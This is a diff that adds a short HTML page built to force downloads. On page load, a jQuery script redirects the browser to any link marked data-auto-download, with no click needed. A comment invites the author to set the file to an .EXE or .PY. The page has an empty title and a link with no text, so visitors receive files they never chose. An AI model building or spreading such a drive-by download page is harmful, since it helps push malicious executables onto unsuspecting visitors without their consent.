@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
+<script>
+$(function() {
+$('a[data-auto-download]').each(function(){
+var $this = $(this);
+setTimeout(function() {
+window.location = $this.attr('href');
+}, 200);
+});
+});
+</script>
+</head>
+<body>
+<div class="wrapper">
+<!-- DEFINE FILE TO SEND  .EXE .PY ..ETC -->
+<a data-auto-download href="Image/Fnew.png" ></a>
+</a>
+</div>
+</body>
+</html>
